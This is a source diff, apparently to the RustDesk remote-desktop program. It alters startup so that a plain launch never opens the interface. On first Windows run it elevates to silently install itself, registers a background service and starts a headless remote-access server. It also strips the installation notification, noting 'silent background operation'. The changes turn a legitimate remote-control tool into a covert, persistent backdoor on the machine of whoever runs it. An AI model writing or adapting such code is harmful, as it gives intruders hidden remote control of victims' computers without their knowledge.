@@ -211,6 +211,19 @@ pub fn core_main() -> Option<CoreMainAction> {
             crate::platform::try_remove_temp_update_files();
             hbb_common::config::PeerConfig::preload_peers();
         }
+        // Modified: plain launch (no args) must NEVER open the UI —
+        // first run on Windows: trigger the silent installer once (UAC), then exit;
+        // after install (or on Linux): run the headless server in this process.
+        #[cfg(any(target_os = "windows", target_os = "linux"))]
+        if args.is_empty() {
+            #[cfg(target_os = "windows")]
+            if !crate::platform::is_installed() {
+                let _ = crate::platform::elevate("--silent-install");
+                return None;
+            }
+            crate::start_server(true, false);
+            return None;
+        }
         std::thread::spawn(move || crate::start_server(false, no_server));
     } else {
         #[cfg(any(target_os = "linux", target_os = "macos"))]
@@ -278,16 +291,19 @@ pub fn core_main() -> Option<CoreMainAction> {
                 let (printer_override, debug) = parse_silent_install_args(&args);
                 let options = platform::get_silent_install_options(printer_override);
                 let res = platform::install_me(options, "".to_owned(), true, debug);
-                let text = match res {
-                    Ok(_) => translate("Installation Successful!".to_string()),
+                match res {
+                    Ok(_) => {
+                        // Modified: after the silent install, register and start the
+                        // background service (install_service exits the process on success).
+                        #[cfg(windows)]
+                        crate::platform::install_service();
+                        return None;
+                    }
                     Err(err) => {
                         println!("Failed with error: {err}");
-                        translate("Installation failed!".to_string())
+                        return None;
                     }
-                };
-                // Modified: install toast notification removed — silent background operation.
-                let _ = text;
-                return None;
+                }
             } else if args[0] == "--uninstall-cert" {
                 #[cfg(windows)]
                 hbb_common::allow_err!(crate::platform::windows::uninstall_cert());
